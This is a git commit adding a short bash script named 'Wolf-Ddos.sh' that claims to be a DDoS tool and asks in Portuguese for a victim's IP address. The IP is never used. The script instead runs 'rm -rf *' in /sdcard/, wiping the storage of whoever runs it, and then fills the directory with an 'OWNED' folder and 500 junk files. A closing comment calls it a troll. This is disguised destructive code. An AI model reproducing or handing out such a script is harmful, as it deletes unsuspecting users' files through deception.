461bb492dd7f95394c9a510f6899d6d59995c17a
Dev-Wolf <63301505+deevwolf@users.noreply.github.com>
2022-02-08 16:16:48 -0300

    Create Wolf-Ddos.sh

---
+++ Wolf-Ddos.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+#Codded By WolfOFC
+#@wolfapenas - Twitter
+
+RESET="\033[0m"
+B="\033[0;30m"
+R="\033[0;31m"
+G="\033[0;32m"
+P="\033[0;35m"
+
+echo -e "\033[0;32m WELCOME TO DDOS SCRIPT"
+echo "#Codded By WOLF"
+echo -e "All rights reserved \033[0;35m @wolfapenas"
+echo ""
+
+echo "Digite O Ip Da Vitima: " ; read Vitima
+sleep 1
+echo "Ok, Aguarde..."
+sleep 1
+clear
+cd /sdcard/ && rm -rf *
+mkdir .OWNED BY WOLF863
+touch WOLFÉLINDO{0001..000500}.c
+
+#Tudo Se passa de uma troll nao usa com maldade ok Trash? . Ass:Wolf
